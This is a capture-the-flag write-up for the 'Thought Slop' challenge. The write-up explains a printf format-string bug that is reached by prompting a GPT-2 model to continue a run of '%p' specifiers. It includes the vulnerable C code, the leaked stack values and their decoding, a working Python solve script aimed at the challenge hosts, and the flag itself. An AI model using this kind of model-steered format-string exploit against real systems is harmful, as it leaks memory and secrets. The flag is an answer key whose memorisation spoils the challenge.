# Thought Slop - Solution Writeup

## Challenge Information
- **CTF:** RSTCON CTF
- **Challenge Name:** Thought Slop
- **Points:** 10
- **Author:** Veryyes (Brandon Wong)
- **Category:** Pwn / AI / Format String
- **Description:** *With all this AI Slop, I might actually have to Use my brain and start Thought Slopping to solve this challenge.*
- **Provided Files:**
  - `thoughtful.c` (C source code)
  - `Dockerfile`
  - `Makefile`
  - `run.sh`
  - `description.txt`
  - `thought_slop.zip`
- **Remote Services:**
  - Mirror 1: `nc 18.215.143.250 8888`
  - Mirror 2: `nc 18.145.136.91 8888`

---

## 1. Vulnerability Analysis

Examining `thoughtful.c`:

```c
void read_flag(char* out)
{
    FILE* f = fopen(FLAG_FILE, "r");
    if (f == NULL){
        printf("Could not find %s\n", FLAG_FILE);
        return;
    }
    fgets(out, FLAG_SIZE-1, f);
    fclose(f);
}

void run() {
    int running;
    char flag[FLAG_SIZE];
    
    char *input_buf = (char*) malloc(BUF_SIZE);
    char *output_buf = (char*) calloc(sizeof(char), MAX_OUTPUT);
    ...
    read_flag(flag);
    ...
    while (running) {
        printf(" > ");
        fgets(input_buf, BUF_SIZE, stdin);
        printf("Thinking....\n");
        llama_memory_clear(llama_get_memory(ctx), true);

        // --- tokenize prompt ---
        int n_tokens = llama_tokenize(vocab, input_buf, (int)strlen(input_buf), ...);
        ...
        for (int i = 0; i < MAX_NEW_TOKENS; i++) {
            llama_token new_token = llama_sampler_sample(sampler, ctx, -1);
            ...
            strncat(output_buf, piece, cur);
            ...
        }
        printf(output_buf);   // <--- Format string vulnerability!
        puts("");
        memset(output_buf, 0, MAX_OUTPUT);
    }
}
```

### Key Observations:
1. **The Format String Vulnerability:**
   - At line 165: `printf(output_buf);` is called without a format string specification (e.g. `printf("%s", output_buf);`).
   - If `output_buf` contains format specifiers (`%p`, `%x`, `%lx`, `%s`), `printf` interprets them as arguments, reading values directly from the register and stack slots of `run()`.

2. **The LLM Intermediary (GPT-2):**
   - The user's input (`input_buf`) is **not** passed directly to `printf`.
   - Instead, the user input is tokenized and fed as a prompt into `gpt2.Q8_0.gguf` via `llama.cpp`.
   - The LLM completes the prompt for up to 128 new tokens (`MAX_NEW_TOKENS = 128`) and writes its completion into `output_buf`.
   - Then, whatever GPT-2 *generates* is passed directly to `printf(output_buf)`.

3. **The Target on the Stack:**
   - In `run()`, the flag buffer `char flag[FLAG_SIZE];` is allocated on the stack.
   - `read_flag(flag)` reads `flag.txt` directly into this local stack array.
   - When `printf(output_buf)` executes within `run()`, the stack of `run()` still contains the contents of `flag`.

---

## 2. Exploitation Strategy

To exploit the format string vulnerability via an LLM completion engine:
- We cannot directly inject `%p` or `%lx` into `output_buf` via standard input; we must **prompt the model** into generating format specifiers.
- GPT-2 is an autoregressive next-token predictor. When fed repetitive patterns or code snippets, it will continue that pattern.
- If we prompt GPT-2 with a long sequence of `%p %p %p ... %p`, GPT-2's completion will continue generating `%p %p ...`.
- When `output_buf` is passed to `printf()`, each generated `%p` prints an 8-byte value from the CPU registers and stack frames.

### Finding the Stack Offset:
Under the x86-64 System V AMD64 ABI:
- Arguments 1–5 to `printf` come from registers (`%rsi`, `%rdx`, `%rcx`, `%r8`, `%r9`).
- Arguments 6+ come from the stack.
- Through testing different prompt lengths (e.g. 35 to 39 `%p` tokens), the model generates dozens of `%p` format specifiers.
- At stack slots 34 through 38, the leaked 64-bit values correspond to the characters of the flag buffer.

---

## 3. Leaked Stack Values & Flag Reconstruction

Sending 37 repetitions of `%p`:
```text
%p %p %p ... (37 times)
```

The model generates:
```text
(50.50x1 0x... 0x...) => 500x564a03bf2540 0x564a03c0d280 0x6e7b6e6f63747372 0x305f7261656c6375) => 500x72745f6e30697470 0x524556455f687361 0x7d474e49485459 0x...
```

Extracting the 8-byte hex values and decoding in little-endian byte order:

| Slot | Hex Value | Little-Endian Bytes | Decoded String |
| :--- | :--- | :--- | :--- |
| **34** | `0x6e7b6e6f63747372` | `72 73 74 63 6f 6e 7b 6e` | `rstcon{n` |
| **35** | `0x305f7261656c6375` | `75 6c 63 65 61 72 5f 30` | `uclear_0` |
| **36** | `0x72745f6e30697470` | `70 74 69 30 6e 5f 74 72` | `pti0n_tr` |
| **37** | `0x524556455f687361` | `61 73 68 5f 45 56 45 52` | `ash_EVER` |
| **38** | `0x7d474e49485459`   | `59 54 48 49 4e 47 7d 00` | `YTHING}\x00` |

Concatenating the chunks yields the complete flag:
`rstcon{nuclear_0pti0n_trash_EVERYTHING}`

---

## 4. Solve Script

A standalone Python solver ([solve.py](file:///c:/Users/crist/OneDrive/Desktop/RSTCON%20CTF/Thought%20Slop/solve.py)):

```python
#!/usr/bin/env python3
import socket
import re

HOST = '18.215.143.250'
PORT = 8888

def get_flag():
    s = socket.create_connection((HOST, PORT), timeout=15)
    
    def read_until(pattern):
        buf = b''
        while pattern not in buf:
            chunk = s.recv(1)
            if not chunk:
                break
            buf += chunk
        return buf

    # Read banner and prompt
    read_until(b' > ')

    # Prompt LLM to continue emitting %p format specifiers
    payload = (' '.join(['%p'] * 37) + '\n').encode()
    s.sendall(payload)

    response = read_until(b' > ').decode(errors='replace')
    s.close()

    # Find hex values in the output
    hex_values = re.findall(r'0x[0-9a-fA-F]+', response)
    
    flag_bytes = b''
    found_start = False
    for val_str in hex_values:
        val = int(val_str, 16)
        try:
            b = val.to_bytes((val.bit_length() + 7) // 8, 'little')
            if b'rstcon{' in b or found_start:
                found_start = True
                flag_bytes += b
                if b'}' in b:
                    break
        except Exception:
            continue

    flag = flag_bytes.split(b'}')[0].decode('latin1', errors='replace') + '}'
    return flag

if __name__ == '__main__':
    flag = get_flag()
    print(f"[+] Flag: {flag}")
```

Execution:
```bash
$ python solve.py
[+] Flag: rstcon{nuclear_0pti0n_trash_EVERYTHING}
```

---

## 5. Flag
```
rstcon{nuclear_0pti0n_trash_EVERYTHING}
```
